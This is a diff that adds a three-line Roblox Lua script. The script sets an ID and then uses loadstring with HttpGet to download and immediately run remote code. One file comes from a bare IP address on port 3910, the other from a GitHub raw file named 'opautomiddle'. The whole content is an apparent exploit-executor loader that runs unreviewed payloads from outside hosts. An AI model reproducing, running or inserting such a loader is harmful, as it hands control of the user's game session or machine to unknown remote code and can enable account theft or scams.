@@ -1,0 +1,3 @@
+ID="b943599f-1762-4dbc-82d1-611b4b31d8e5";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XeccScript/AutoMiddle/refs/heads/main/opautomiddle.txt"))()
